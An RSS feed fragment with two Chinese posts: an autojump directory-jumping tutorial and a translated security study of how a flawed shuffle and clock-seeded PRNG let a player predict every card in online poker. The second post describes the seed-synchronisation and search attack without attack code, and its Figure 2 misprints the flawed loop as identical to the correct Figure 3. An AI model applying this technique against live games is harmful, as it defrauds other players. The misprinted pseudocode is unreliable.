&lt;p&gt;在命令行中切换目录是最常用的操作，不过很少有比一遍又一遍重复“cd ls cd ls cd ls ……”更令人沮丧的事情了。如果你不是百分百确定你想要进入的下一个目录的名字，那么你不得不使用ls来确认，然后使用cd来进入你想要进的那一个。所幸的是，现在大量的终端和shell语言提供了强大的自动补全功能来处理该问题。但是，你仍然需要一直疯狂地敲击TAB键来干这事。如果你和我一样懒惰，你一定会对autojump感到惊喜。&lt;/p&gt;
&lt;p&gt;autojump是一个命令行工具，它允许你可以直接跳转到你喜爱的目录，而不用管你现在身在何处。&lt;/p&gt;
&lt;h3 id=&quot;toc_1&quot;&gt;在Linux上安装autojump&lt;/h3&gt;
&lt;p&gt;在Ubuntu或Debian上安装autojump：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ sudo apt-get install autojump&lt;/pre&gt;
&lt;p&gt;要在CentOS或Fedora上安装autojump，请使用yum命令。在CentOS上，你需要先&lt;a href=&quot;http://xmodulo.com/2013/03/how-to-set-up-epel-repository-on-centos.html&quot;&gt;启用EPEL仓库&lt;/a&gt;才行。&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ sudo yum install autojump&lt;/pre&gt;
&lt;p&gt;在Archlinux上安装autojump：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ sudo pacman -S autojump&lt;/pre&gt;
&lt;p&gt;如果你找不到适合你的版本的包，你可以从&lt;a href=&quot;https://github.com/joelthelion/autojump&quot;&gt;GitHub&lt;/a&gt;上下载源码包来编译。&lt;/p&gt;
&lt;h3 id=&quot;toc_2&quot;&gt;autojump的基本用法&lt;/h3&gt;
&lt;p&gt;autojump的工作方式很简单：它会在你每次启动命令时记录你当前位置，并把它添加进它自身的数据库中。这样，某些目录比其它一些目录添加的次数多，这些目录一般就代表你最重要的目录，而它们的“权重”也会增大。&lt;/p&gt;
&lt;p&gt;现在不管你在哪个目录，你都可以使用下面的语法来直接跳转到这些目录：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;autojump [目录的名字或名字的一部分]&lt;/pre&gt;
&lt;p&gt;注意，你不需要输入完整的名称，因为autojump会检索它的数据库，并返回最可能的结果。&lt;/p&gt;
&lt;p&gt;例如，假定我们正在下面的目录结构中工作。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/5ac2b235e8f05cf2e114fb3dfe2969d5.jpg&quot; rel=&quot;lightbox[73611]&quot; title=&quot;自动补完不算什么，一键直达目录才是终极神器！&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73608&quot; alt=&quot;rger140043jbr5bwr2n1znj87c&quot; src=&quot;/images/jobbole.com/27ecc25eed09c8f3d23f5ec33fcad643.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么下面的命令将直接让你跳到/root/home/doc下，不管你当前位置在哪里。&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ autojump do&lt;/pre&gt;
&lt;p&gt;如果你也很讨厌打字，那么我推荐你为autojump起个别名，或者使用默认的别名。&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ j [目录的名字或名字的一部分]&lt;/pre&gt;
&lt;p&gt;另外一个引人注目的功能是，autojump支持zsh和自动补完。如果你不确认哪里是不是你要跳转的地方，敲击TAB键就会列出完整路径。&lt;/p&gt;
&lt;p&gt;还是同样的例子，输入：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ autojump d&lt;/pre&gt;
&lt;p&gt;然后敲击tab键，将会返回/root/home/doc或者/root/home/ddl。&lt;/p&gt;
&lt;p&gt;最后，对于高级用户，你可以访问目录数据库，并修改它的内容。可以使用下面的命令来手动添加一个目录：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ autojump -a [目录]&lt;/pre&gt;
&lt;p&gt;如果你突然想要把当前目录变成你的最爱和使用最频繁的文件夹，你可以在该目录通过命令的参数 i 来手工增加它的权重&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ autojump -i [权重]&lt;/pre&gt;
&lt;p&gt;这将使得该目录更可能被选择跳转。相反的例子是在该目录使用参数 d 来减少权重：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ autojump -d [权重]&lt;/pre&gt;
&lt;p&gt;要跟踪所有这些改变，输入：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ autojump -s&lt;/pre&gt;
&lt;p&gt;这会显示数据库中的统计数据。而以下：&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;$ autojump --purge&lt;/pre&gt;
&lt;p&gt;命令将会把不再存在的目录从数据库中移除。&lt;/p&gt;
&lt;p&gt;简言之，autojump将会受到所有命令行高级用户的欢迎。不管你是在ssh进一台服务器，还是仅仅想要追随复古潮流，敲更少的键来减少导航时间总是件好事。如果你真的热衷于此类工具，你也肯定也想看看&lt;a href=&quot;https://github.com/clvv/fasd&quot;&gt;Fasd&lt;/a&gt;，它应该会给你一个惊喜——我们下次再介绍它。&lt;/p&gt;
&lt;p&gt;你觉得autojump怎么样？你会经常用它么？发表一下你的评论吧。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Tue, 15 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-15-73611-c58e1239a.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-15-73611-c58e1239a.html</guid>
        
        
      </item>
    
      <item>
        <title>在线扑克如何作弊：一次软件安全研究</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;&lt;!--?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?--&gt;&lt;/p&gt;
&lt;p&gt;扑克是一种风靡世界的纸牌游戏，我们不仅可以在家中的餐桌上、赌场上、或者桥牌室中玩扑克，现在还可以在网上玩。我们研究可靠软件技术的一些人也玩扑克。因为我们现在都会花大量的时间在网上，所以将打扑克和可靠软件技术研究结合在一起只是时间问题。我们将在线扑克游戏和软件安全结合起来研究后，发现一个巨大的安全漏洞，这就是本篇文章所要讲的。&lt;/p&gt;
&lt;p&gt;人们可以在PlanetPoker这样的互联网桥牌室与其他人打德州扑克，这些游戏是实时的，而且用真钱。由于我们的主要工作是为公司提供安全、可靠且健壮的软件，所以我们很好奇在线游戏背后的软件是什么样的。它如何运行？是否公平？我们查看了PlanetPoker网站上的FAQ页面，这个页面包含它们的洗牌算法（为展现游戏公平性而公开洗牌算法，这还是很令人惊讶的），这些足以开始我们的分析了。当我们看到洗牌算法时，就开始怀疑这其中可能有问题。一个小小的调查研究证明这种直觉是正确的。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;游戏&lt;/h2&gt;
&lt;p&gt;在德州扑克中，每个玩家发两张牌（称作底牌）。最初的发牌后是一轮下注。第一轮下注结束后，接下来所有的发牌都是牌面朝上，所有玩家都可以看到的。庄家在牌桌上发三张牌面朝上的牌（称为翻牌），然后就是第二轮下注。德州扑克一般是定额下注，就是说每个玩家在每一轮下注都是定额。比如，在3美元到6美元的游戏中，前两轮是3美元赌注，而第三轮和第四轮是6美元赌注。第二轮下注后，庄家在牌桌上再发一张牌面朝上的牌（称为转牌），然后就是第三轮下注。最后，庄家在牌桌上再发最后一张牌面朝上的牌（称为河牌），然后就是最后一轮下注。剩余的每个玩家使用自己手中的两张底牌和牌桌上的五张公共牌，从这七张牌中选五张，凑成最大的组合。玩家凑成的成手牌的好坏由标准扑克成手牌顺序决定。&lt;/p&gt;
&lt;p&gt;德州扑克是一种快节奏的，令人兴奋的游戏。这个游戏很重要的一个组成是虚张声势，并且玩家要对其他玩家持有的牌做快速判断，这些判断决定谁是最终的胜者。有趣的是，德州扑克还是每年在拉斯维加斯举办的世界扑克系列赛中的其中一项。&lt;/p&gt;
&lt;p&gt;既然现在每个人和他们的狗都是在线的，而且几乎所有类型的业务都被呈现在互联网上，那么在线赌场和桥牌室的出现就再自然不过了。虽然说要进赌场的话，去印第安保留区和河船就很容易做到，但是更方便的参与游戏仍是现在的真实需求。如果能在自己家舒舒服服的上网娱乐（更别说可以穿着自己的睡衣），不用忍受二手烟，以及那些令人讨厌的玩家，这绝对是很吸引人的。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;安全风险无处不在&lt;/h2&gt;
&lt;p&gt;所有的便利都伴随着一定的代价。很不幸，玩在线扑克存在真正的风险。赌场本身可能就是一个骗局，其存在只是为了从玩家手上拿钱，它根本没有打算回报玩家任何胜局。运行在线赌场的服务器也可能被恶意攻击者破解，以获得信用卡号码，或者尝试在游戏中利用一些优势。因为大多数赌场不对玩家的客户端程序和托管纸牌游戏的服务器之间的网络流量进行认证和加密，可想而知，一个恶意玩家就可能检查这些网络流量（采用经典的中间人攻击），以确定对手牌。这些风险都是网络安全专家非常熟悉的。&lt;/p&gt;
&lt;p&gt;串通也是一个扑克所独有的问题（不同于其他游戏，如21点或掷骰子）。因为扑克玩家互相对抗，他们的对手并不是赌场本身。当一个桌子上的两个或多个玩家互相串通时，他们作为一个团队一起玩，往往会使用相同的资金。互相串通的玩家知道他们团队成员手上的牌（通常是通过细微的信号），而且他们为使团队获得最大的利益而下注，不管是团队中的谁赢都行。串通在现实的桥牌室中是一个问题，但对在线扑克来说，这个问题更严重。在线玩家可以使用即时通讯工具、电话会议聊天工具等，这使得串通问题成为一个严重的风险。如果一个在线游戏的所有玩家都一起合作，来欺骗那些不质疑网络安全的，容易受骗的玩家怎么办？你怎么保证你永远不会成为这些攻击的受害者呢？&lt;/p&gt;
&lt;p&gt;最后也很重要的一个风险（特别是对本文而言），就是在线扑克软件本身可能存在缺陷。软件问题是引起安全风险的一种臭名昭著的形式，而且它常常被过分相信防火墙和加密技术的公司所忽略。软件应用程序会给一个系统带来非常多的安全漏洞，我们每天都会花大量的时间来找出并解决这些软件安全问题，所以我们注意到在线扑克也是迟早的事。本文的其余部分就专门来讨论我们在一个流行的在线扑克游戏中发现的软件安全问题。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3&gt;软件安全风险&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;洗虚拟牌&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们关注的第一个软件缺陷涉及洗虚拟牌。公平洗牌意味着什么呢？本质上来说，它意味着牌的所有可能组合出现的概率相等，我们称对这52张牌的每个排序为一次洗牌。&lt;/p&gt;
&lt;p&gt;对真实的一副牌，有52!（约2^226）种不重复的洗牌。计算机洗一副虚拟牌时，它从这些可能的组合中选一种。现在有很多洗牌算法，一些算法优于其它，一些则是完全错误的。&lt;/p&gt;
&lt;p&gt;ASF软件公司开发的算法被大部分在线扑克游戏所使用。我们发现他们的洗牌算法有很多缺陷，根据这些发现，我们联系了ASF公司，他们更改了他们的算法，但是我们还没有看他们的新算法。从安全角度确保一切都完全正确并不容易啊（本文的其余部分将会介绍）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图表一：有缺陷的ASF洗牌算法&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;brush: pascal; gutter: true&quot;&gt;procedure TDeck.Shuffle;
var
    ctr: Byte;
    tmp: Byte;

    random_number: Byte;
begin
    { Fill the deck with unique cards }
    for ctr := 1 to 52 do
        Card[ctr] := ctr;

    { Generate a new seed based on the system clock }
    randomize;

    { Randomly rearrange each card }
    for ctr := 1 to 52 do begin
        random_number := random(51)+1;
        tmp := card[random_number];
        card[random_number] := card[ctr];
        card[ctr] := tmp;
    end;

    CurrentCard := 1;
    JustShuffled := True;
end;&lt;/pre&gt;
&lt;p&gt;上面是ASF软件公司发布的洗牌算法，以使人们相信他们的计算机生成的洗牌是完全公平的。不过讽刺的是，这一举措对我们来说是完全相反的效果。&lt;/p&gt;
&lt;p&gt;算法开始时先初始化一个数组，其值按顺序依次为1到52，代表52张可能的牌。然后程序用系统时间作种子，调用Randomize()初始化一个伪随机数发生器。实际的洗牌是通过依次将数组中的每个位置与一个随机选择的位置交换。这个随机选择的位置是通过调用伪随机数发生器选择的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;问题一：大小差一（Off-By-One）错误&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;精明的程序员就会发现，该算法包含一个大小差一（off-by-one）错误。该算法遍历初始的那副牌，将其每张牌与其它任意牌交换。然而和大多数Pascal函数不同，Random(n)函数实际上返回一个0到n-1的数字，而不是1到n。算法利用接下来的一小段代码来选择与当前牌交换的牌：这个公式设置一个值在1到51之间的随机数。总之，该算法从不选择最后一张牌与当前牌交换。当ctr最终指向最后一张牌，也就是第52张牌时，这张牌可以与任何其它牌交换，除了它自身。也就是说，这个洗牌算法从不允许第52张牌在洗牌结束后依然在第52个位置。这很明显违反了公平原则，不过很容易修复。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;问题二：设计不良的洗牌分布&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进一步考察该洗牌算法后，我们发现，即使不考虑大小差一（off-by-one）问题，该算法返回的洗牌结果也不是均匀分布的。该洗牌的核心基本算法如图2所示。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;洗牌&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进一步考察算法后发现，即使不考虑大小差一（off-by-one）错误，该算法返回的洗牌结果也不是均匀分布的。也就是说，一些洗牌结果出现的概率比其它洗牌结果出现的概率大。如果一个玩家知道这个漏洞，就可以在一个牌桌上坐很久，从而利用这种不均匀分布的优势。&lt;/p&gt;
&lt;p&gt;我们用一个小例子来说明这种问题，这里我们采用上述洗牌算法来洗牌，这副牌只有三张（n=3）。&lt;/p&gt;
&lt;p&gt;图2：不要这样洗牌&lt;/p&gt;
&lt;pre class=&quot;brush: pascal; gutter: true&quot;&gt;for (i is 1 to 3)
    Swap i with random position between i and 3&lt;/pre&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/0e8cca2e064262251dfcba44f3ba596a.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;图2描述了我们所采用的洗牌算法，并且描绘了采用该算法生成所有可能的洗牌结果的树。如果随机数源设计良好的话，那么这棵树中所有叶子出现的概率相等。&lt;/p&gt;
&lt;p&gt;即使只考虑这个小例子，我们就可以发现，该算法的洗牌结果不是等概率的。231、213、132比312、321、123出现的更频繁。如果你要对第一张牌下注，并且你知道上述这些洗牌结果的出现概率，你就会知道牌2比其它牌出现的概率大。而当一副牌的牌数增加时，这种概率不等现象会愈发被放大。当用上述算法洗52张牌时（n=52），洗牌的这种不均匀分布会造成某些手牌出现概率偏大，从而改变赔率。一些经验丰富的玩家，他们专门研究赔率，然后就可以利用这种倾斜的手牌概率来赢得赌博。&lt;/p&gt;
&lt;p&gt;图3：可以这样洗牌&lt;/p&gt;
&lt;pre class=&quot;brush: pascal; gutter: true&quot;&gt;for (i is 1 to 3)
    Swap i with random position between i and 3&lt;/pre&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/7a61e6133f5fc4f336f88bb6e3ed472d.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;图3提供了一个更好的洗牌算法。它与上述算法的关键区别在于，遍历一副牌时，每张牌可能的交换位置减少了。同样，我们用三张牌的洗牌树来解释这个算法。和ASF提供的算法不同，该新算法将每张牌i与[i，n]中的某张牌交换，而不是[1，n]中的某张牌交换，从而将叶子数从3^3=27减少到了3!=6.这很重要，因为n!个不同的叶子意味着，所有可能的洗牌结果，新洗牌算法都会洗出一次，而且仅仅一次，从而每种洗牌结果出现的概率相等，这才是公平！&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3&gt;在确定性机器上生成随机数&lt;/h3&gt;
&lt;p&gt;我们讨论的第一组软件缺陷仅仅改变某些牌出现的概率，一些聪明的赌徒可以利用这种概率倾斜为自己创造优势，但是这种缺陷并不会完全破环这个系统。相比之下，这部分我们将要讨论的第三种缺陷，绝对是可以让在线扑克玩家完全妥协的“好东西”了。首先我们简短介绍伪随机数生成器，为下文奠定基础。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3&gt;伪随机数生成器原理&lt;/h3&gt;
&lt;p&gt;假设我们要生成1到52之间的一个随机数，每个数字等概率出现。理想情况下，我们生成0到1之间的一个值，然后将这个值乘以52，其中每个值等概率出现，且不受前值影响。注意0到1之间有无穷多个数，但是计算机不提供无限精度。&lt;/p&gt;
&lt;p&gt;为使计算机做到上述算法所描述的，伪随机数生成器通常产生一个从0到N之间的整数，然后用那个整数除以N，这样返回结果就总是0到1之间的数了。之后我们调用生成器时，它将第一次调用产生的整数结果传递给一个函数，这个函数生成一个0到N之间的新整数，然后返回新整数除以N的结果。这意味着，任何伪随机数生成器返回的唯一值的数目被限定为0到N之间整数的个数。而在大多数常见的随机数生成器中，N是2^32（约40亿），也就是32位数的最大值。换句话说，这种生成器最多能产生40亿个可能的值。扳起手指数一数也知道，40亿不算多。&lt;/p&gt;
&lt;p&gt;开始要给伪随机数生成器提供一个种子，作为初始的整数，将其传递给那个函数。种子是生成随机数字序列的开端。要注意，伪随机数生成器的输出是完全可预测的，它返回的每个值都完全由其先前返回的值决定（最终，由种子决定，即种子是一切的开始）。如果我们知道用于计算任意一个值的那个整数，那么生成器后续给出的所有值都是可知的。&lt;/p&gt;
&lt;p&gt;图4是宝蓝（Borland）编译器提供的伪随机数生成器，它就是一个很好的例子。如果我们知道RandSeed的当前值为12345，那么它产生的下一个整数是1655067934，然后其返回值将是20.由于计算机是完全确定性的机器，所以事情总是如此。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图4：宝蓝的Random()函数实现&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;brush: pascal; gutter: true&quot;&gt;long long RandSeed = #### ;

unsigned long Random(long max)
{
     long long x ;
     double i ;
     unsigned long final ;
     x = 0xffffffff;
     x += 1 ;

     RandSeed *= ((long long)134775813);
     RandSeed += 1 ;
     RandSeed = RandSeed % x ;
     i = ((double)RandSeed) / (double)0xffffffff ;
     final = (long) (max * i) ;

     return (unsigned long)final;
}&lt;/pre&gt;
&lt;p&gt;历史经验表明，随机数生成器的种子通常是基于系统时钟产生，也就是用系统时间的某些方面作为种子。这意味着，如果你知道生成器是基于哪个时间做种子，你就知道生成器将会生成的所有数值（包括数字出现的顺序）。这一切的结果是，伪随机数完全可预知。毋庸置疑，这一事实对洗牌算法影响深远。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3&gt;在玩扑克时，随机数生成器是如何被错误使用的&lt;/h3&gt;
&lt;p&gt;ASF软件使用的洗牌算法总是开始于一副有序的牌，然后生成一个随机数序列，用于重排那副牌。回想一下，一副真正的扑克牌有52!（约2^226）种各不相同的洗牌结果，而一个32位随机数生成器的种子必须是一个32位数，也就是只有40多亿个可能的种子。而每次洗牌前，都会对牌以及生成器种子初始化，所以该算法只能产生40多亿个可能的洗牌结果，而40多亿要远远小于52!.&lt;/p&gt;
&lt;p&gt;更糟的是，图一所示的算法采用Pascal函数Randomize()为随机数生成器选择种子。Randomize()函数基于午夜开始的毫秒数选择种子，一天只有86,400,000毫秒。因为这些数字被用作生成器的种子，从而可能的洗牌结果缩减为86,400,000个。八千六百万要远远小于40亿，但这还不是最糟的。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3&gt;破坏系统&lt;/h3&gt;
&lt;p&gt;了解系统时钟种子后，我们有一个想法，可以把洗牌结果数目减少的更多。通过将我们的程序与生成伪随机数的服务器系统时钟同步，我们可以将可能的组合数降至200,000之后，这个系统就是我们的了，因为搜索这么小的洗牌结果集完全不在话下，在PC上就可以实时完成。&lt;/p&gt;
&lt;p&gt;RST攻击本身要求这副牌中的5张牌已知，基于这5张已知牌，我们的程序搜索那几十万个洗牌结果集，然后推导出完美匹配的一个。在德州扑克这个案例中，我们的程序将作弊玩家的两张底牌以及前三张翻牌（公共牌）作为输入。这五张牌在第一轮下注后就全部已知了，有这些信息就足以让我们在比赛中实时确定准确的洗牌结果。图5是我们为攻击粗粗设计的GUI。左上角的“Site Parameters“框用于同步时钟，右上角的”Game Parameters“用于输入5张牌，并初始化搜索。图5是所有的牌都被程序确定后的一张截图。我们现在知道谁拿了什么牌，以及剩余的翻牌值，还有谁会提前赢。&lt;/p&gt;
&lt;p&gt;图5：攻击的图形用户界面GUI&lt;/p&gt;
&lt;p&gt;&lt;img id=&quot;pic&quot; alt=&quot;&quot; src=&quot;/images/jobbole.com/91be54747f410cb6ea96db240de16647.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;一旦知道5张牌，我们的程序就开始不断的生成洗牌，直到那个洗牌中包含这5张牌，并且顺序也一样。由于Randomize()函数基于服务器的系统时间，因此在合理精度内猜对开始的种子并不难（猜得越接近，需要搜索的洗牌结果数就越少）。然而最棒的是这个，一旦找到一个正确的种子，就有可能在几秒钟内将我们的攻击程序与服务器同步。这种事后同步允许我们的程序不到1秒就确定随机数生成器使用的种子，以及接下来游戏将要使用的所有的洗牌。&lt;/p&gt;
&lt;p&gt;除了技术细节，我们的攻击也被很多新闻媒体所报道，这种媒体覆盖也体现了这个发现人性的一面。登陆我们的&lt;a href=&quot;http://www.cigital.com/&quot; target=&quot;_blank&quot;&gt;网站&lt;/a&gt;&lt;a href=&quot;http://www.cigital.com/&quot;&gt;Web site&lt;/a&gt; ，可以看到我们最初的发布稿 &lt;a href=&quot;http://www.cigital.com/news/index.php?pg=art&amp;amp;artid=20&quot;&gt;original press release&lt;/a&gt;，CNN视频剪辑，还有纽约时报的一个故事。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3&gt;洗虚拟牌的正确做法&lt;/h3&gt;
&lt;p&gt;正如我们所见，洗虚拟牌乍看容易，其实不然。要写洗牌算法，最好的方法是，基于扎实的数学基础开发一种可以安全地产生良好的洗牌的技术。此外，我们认为发布一个好算法，并允许被大家审查，是一个很不错的想法（这与开源狂热者的观点不谋而合），关键是不能置安全性于模糊状态。像ASF一样发布一个差算法并不好，但不发布这样的差算法也不好！&lt;/p&gt;
&lt;p&gt;密码学基于坚实的数学基础开发健壮的算法，用于保护个人、政府和商业机密，而不是基于模糊的理论。洗牌也一样，我们可以将加密密钥的长度与随机种子的规模做类比，其中，加密密钥的长度直接关系到很多加密算法的强度。&lt;/p&gt;
&lt;p&gt;开发一个洗牌算法相当简单。首先要清楚，算法不需要能产生52!种洗牌结果，因为玩牌时只会用到很少部分的洗牌结果。然而算法产生的洗牌结果必须是均匀分布的，这非常重要。良好的分布确保在一次洗牌中，每张牌在每个位置出现的概率基本相等。这个分布性要求相对容易实现和验证。下面的伪代码描述了一个简单的洗牌算法，如果配上合适的随机数生成器，该算法产生的洗牌结果是均匀分布的。&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;START WITH FRESH DECK
GET RANDOM SEED
FOR CT = 1, WHILE CT &amp;lt;= 52, DO
X = RANDOM NUMBER BETWEEN CT AND 52 INCLUSIVE
SWAP DECK[CT] WITH DECK[X]&lt;/pre&gt;
&lt;p&gt;这个算法成功的关键在于随机数生成器（RNG）的选择。RNG直接影响上述算法能否成功的产生均匀分布的洗牌，以及这些洗牌能否用于安全的在线牌类游戏。首先，RNG本身必须产生均匀分布的随机数。一些伪随机数生成器（PRNG）已经被证明具有此数学属性，比如基于Lehmer算法的伪随机数生成器。这些好的PRNG足以用于生成洗牌时的“随机“数。&lt;/p&gt;
&lt;p&gt;正如我们所见，初始种子的选择是成功与否的关键。所有的事情最终都归结于种子。因此，玩家在玩由PRNG生成的洗牌时，无法确定生成该副洗牌所使用的种子，这一点至关重要。&lt;/p&gt;
&lt;p&gt;要确定生成特定洗牌所使用的种子，一种蛮力做法是，系统地遍历所有可能的种子，生成相应的洗牌序列，并将其与待寻找的洗牌序列对比。为避免这种攻击，可用的种子数一定要多，使得在特定时间限制内，执行穷举搜索不可行。但是要注意，找到一个匹配的洗牌平均只需搜索一半的种子空间。而对于在线扑克，特定时间限制应该是一场游戏的时长，这个时长通常以分钟计。&lt;/p&gt;
&lt;p&gt;根据我们的经验，运行在奔腾400计算机上的简单程序，可以每分钟检查大约200万个种子。按照这个速度，这个机器对32位种子空间（约2^32个可能的种子）的穷举搜索需一天多一点。尽管这个时长必然超过我们规定的那个时间限制，但是如果利用计算机网络执行分布式搜索，那么在我们的时间限制内完成搜索是完全可能的。&lt;/p&gt;
&lt;p&gt;我们讲蛮力攻击主要是想强调加密密钥长度与洗牌使用的种子之间的相似性。暴力破解密码攻击要尝试每个可能的密钥，以破解加密信息。同样，蛮力攻击洗牌算法也要检查所有可能的种子。有关加密密钥的长度，目前已有一个重大的研究发现。总体而言，该研究是这样的：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;3&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Algorithm&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Weak Key&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Typical Key&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Strong Key&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DES&lt;/td&gt;
&lt;td&gt;40 or 56&lt;/td&gt;
&lt;td&gt;56&lt;/td&gt;
&lt;td&gt;Triple-DES&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RC4&lt;/td&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;128&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RSA&lt;/td&gt;
&lt;td&gt;512&lt;/td&gt;
&lt;td&gt;768 or 1024&lt;/td&gt;
&lt;td&gt;2048&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ECC&lt;/td&gt;
&lt;td&gt;125&lt;/td&gt;
&lt;td&gt;170&lt;/td&gt;
&lt;td&gt;230&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;人们以前认为实时破解56位的数据加密算法（DES）不可行，但事实并非如此。1997年1月，一个保密的DES密钥在96天内被找到。之后，又做到41天内破解，然后是56小时，然后是1999年1月，在22小时15分钟内破解。对短的密钥长度或者小的种子集来说，这种破解能力的飞跃发展当然不是好兆头。&lt;/p&gt;
&lt;p&gt;人们甚至还发明了专门的机器，用于破解加密算法。1998年，电子前沿基金会EFF就制造了一个专用机，用于破解DES信息。制造这个机器的目的在于强调DES是多么不堪一击（DES是一种流行的、政府认可的算法，要深入了解DES攻击，请点击 &lt;a href=&quot;http://www.eff.org/descracker/&quot;&gt;http://www.eff.org/descracker/&lt;/a&gt; ）。DES之所以易于被破解，与其密钥长度直接相关。由此可见，制造专用于破解RNG种子的机器也并非不可能啊。&lt;/p&gt;
&lt;p&gt;我们认为32位的种子空间不足以对抗猛烈的蛮力攻击，但是64位的种子空间应该足以抵抗几乎所有的蛮力攻击。因为现在很多计算机都支持64位整数，所以使用64位的种子就很有必要了，而且一个64位数应该足以避免洗牌时遭受蛮力攻击。&lt;/p&gt;
&lt;p&gt;单单用64位还不行。我们决不能断定攻击者肯定无法预测或估计PRNG使用的种子。如果他们有方法预测种子，那么上述蛮力攻击的计算压力就变得无关紧要了，因为相比而言，此时破坏整个系统还要容易的多。我们利用的漏洞，不仅仅是ASF的缺陷算法采用很小的32位的PRNG，还有该方法的种子依赖于一天之中的时间。我们已经证明，这种算法基本无随机性可言。&lt;/p&gt;
&lt;p&gt;总结分析一下，整个系统的安全依赖于选择一个不可预测的随机种子，要实现这样的选择，最好是采用基于硬件的技术。基于硬件的方法从物理环境直接拿到不可预测的随机数据。由于在线扑克等涉及真钱交易的游戏，都对安全性要求至高，所以有必要进行一些投资，以确保随机数生成器正确完成。&lt;/p&gt;
&lt;p&gt;总而言之，开发一个好的洗牌算法，并且采用经过验证的硬件设备为64位伪随机数生成器准备种子，有这两点，足以使洗牌实现公平性以及安全性。实现一个公平的系统并非很难，在线扑克玩家有权提出这样的要求。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

